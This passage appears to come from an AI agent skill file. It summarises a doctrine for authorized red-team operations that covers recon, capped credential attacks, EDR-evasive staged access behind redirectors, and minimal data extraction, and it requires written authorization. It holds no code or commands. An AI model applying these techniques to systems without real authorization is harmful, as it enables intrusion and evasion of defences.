- **`bug-bounty`** — Use for dual-track scope when distinguishing red-team from bounty rules.

> **Summary:** This skill distills 10 curated source skills into one operational doctrine for authorized red team operations: map identity trust edges and internet-exposed management planes first, run aggressive but well-journaled recon, keep credential attacks serial and capped, build EDR-evasive staged access behind smart redirectors, validate every finding with two independent signals plus a canary/baseline diff, treat mid-engagement defensive changes as findings, and stop at minimum-necessary extraction. It is a hunting and emulation discipline — not a license to exceed scope. Every technique requires written authorization.
